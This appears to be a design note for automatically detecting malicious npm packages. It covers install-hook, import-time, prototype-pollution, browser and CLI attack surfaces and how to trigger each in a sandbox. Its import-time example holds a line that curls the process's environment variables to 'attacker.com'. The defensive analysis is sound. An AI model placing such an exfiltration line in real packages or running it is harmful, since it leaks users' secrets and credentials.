# NPM Attack Surfaces

Say an attacker has compromised a package. Where would the malicious behavior be triggered?

The most common one is the `preinstall`/`postinstall` scripts. We can very easily have a generalized test for those just with `npm install` inside a container. However, these attacks are now well known and blocked by CI/CD using `npm ci` instead of `install`.

One level deeper is import/initialization-time attacks. When a JavaScript package is imported, it is first evaluated to gather module exports. For example

```js
// In index.js - runs immediately on require/import
(function () {
  // Steal env vars, write to disk, open network connection
  require("child_process").exec("curl attacker.com/$(env)");
})();

module.exports = {};
```

This is also very easy to detect automatically in tests. We don't actually have to run any functions, just figure out whether the package is ESM/CJS/etc and import accordingly.

A much less likely vector is runtime attacks where the malicious code is only triggered when certain functions are run. This is because it will not reliably trigger even on victim systems. However, there are still a few that we can easily trigger such as prototype pollution.

We can record the baseline prototype state before import, import the package, find the modified prototype properties, and invoke them to trigger any malicious behavior to be caught by eBPF.

Another thing to consider is that NPM packages can be both for NodeJS and browser. A malicious package can add scripts to the browser and exfiltrate things like cookies and local storage. We will consider this an edge case and deal with later as proper headers and such are able to mitigate malicious scripts.

Finally, there are CLI binaries. Those will be harder to automatically test. But again, following the assumption that attackers want their malware to trigger easily and consistently, it should happen during startup of the CLI no matter the arguments. I would just execute them as is without arguments with a timeout in case it's a server or whatnot.
